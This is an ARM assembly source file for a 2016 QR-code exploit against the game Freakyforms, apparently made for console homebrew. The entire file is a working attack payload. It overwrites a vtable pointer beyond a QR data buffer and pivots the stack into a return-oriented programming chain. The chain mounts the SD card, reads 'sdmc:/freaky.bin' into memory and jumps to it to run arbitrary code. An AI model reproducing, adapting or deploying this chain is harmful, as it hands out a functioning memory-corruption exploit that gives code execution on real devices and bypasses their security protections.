/* freakyforms qr code exploit. */
/* plutoo 2016 */
#include "constants.h"

#define MAKE_PTR(addr) (addr - start + QR_BUF_ADDR)

start:
ptr_gadget_set_sp:
    /* Pointer stuck up here just to initialize R7. */
    .word MAKE_PTR(gadget_set_sp)
    /* We have some free space before the rop-chain so let's put data here. */
sdmc_str:
    .ascii "sdmc:\0\0\0"
file_str:
    .string16 "sdmc:/freaky.bin\0"
random_valid_addr:
    .word GARBAGE
    .word GARBAGE
file_obj_ctx:
    .word GARBAGE
    .word GARBAGE
    .word GARBAGE
    .word GARBAGE
    .word GARBAGE
    .word GARBAGE
    .word GARBAGE
    .word GARBAGE
.org 0x6C, 0x41
    /* Start of the initial rop chain. */
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
    .word GARBAGE                     // r7
.word GADGET_R0                   // pop {r0, pc}
    .word MAKE_PTR(sdmc_str)          // r0       mnt_name = "sdmc:"
.word FS_MOUNT_SDMC+4             // fs::MountSdmc(...)
    .word GARBAGE                     // r3
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
.word GADGET_R0                   // pop {r0, pc}
    .word MAKE_PTR(file_obj_ctx)      // r0       output ptr to receive ctx
.word GADGET_R1R2R3R4R5           // pop {r1-r5, pc}
    .word MAKE_PTR(file_str)          // r1       file_path
    .word 1                           // r2       flag = FILE_READ
    .word GARBAGE                     // r3
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
.word FS_OPEN_FILE+4              // fs::TryOpenFile(...)
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
    .word MAKE_PTR(random_valid_addr) // r7
    .word GARBAGE                     // r8
.word GADGET_R1R2R3R4R5           // pop {r1-r5, pc}
    .word GARBAGE                     // r1
    .word 0                           // r2       file_offset = (u64) 0
    .word 0                           // r3
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
.word GADGET_R0                   // pop {r0, pc}
    .word MAKE_PTR(file_obj_ctx) - 4  // r0       put file_ptr into r1.
.word GADGET_LDRD_R0_R0__STRD_R0_R7__POP_R4R5R6R7R8PC
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
    .word GARBAGE                     // r7
    .word GARBAGE                     // r8
.word GADGET_R0                   // pop {r0, pc}
    .word MAKE_PTR(random_valid_addr) // r0       output ptr for bytes_read
.word FS_READ_FILE+4             // fs::TryReadFile(...)
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
    .word GARBAGE                     // r7
    .word GARBAGE                     // r8
    .word GARBAGE                     // r9
    .word GADGET_R1R2R3R4R5           // pc       jump past read-file stack args
    .word FREAKYBIN_LOAD_ADDR         // sp_arg0  output ptr
    .word 0x1000                      // sp_arg1  how many bytes to read
    .word GARBAGE                     // r3
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
.word GADGET_R1R2R3R4R5           // pop {r1-r5, pc}
    .word GARBAGE                     // r1
    .word GARBAGE                     // r2
    .word FREAKYBIN_LOAD_ADDR - MAKE_PTR(sp_when_adding_r3) // r3
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
.word GADGET_ADD_SP_R3__POP_PC    // jump to stage1!
sp_when_adding_r3:
    .word GARBAGE
.org 0x1B0, 0x43
    /* Everything after this point is past our buffer. */
    .word GARBAGE
    .word GARBAGE
    .word GARBAGE
    .word GARBAGE
    /* At this offset there is a vtable ptr that we overwrite. */
    .word MAKE_PTR(gadget_set_r7) - 0x138
    /* Value that is read into R7 later on. */
    .word MAKE_PTR(ptr_gadget_set_sp)
    .word 0xFFFFFFFF
gadget_set_r7:
    /* Gadget that loads R7 and then jump to [[R7]]. */
    .word GADGET_LDR_R7_R0_4__LDR_R0_R7__LDR_R1_R0__BLX_R1
gadget_set_sp:
    /* Gadget that writes R7 into SP, triggering the ROP chain. */
    .word GADGET_ADD_SP_R7_0x64__POP_R4R5R6R7PC
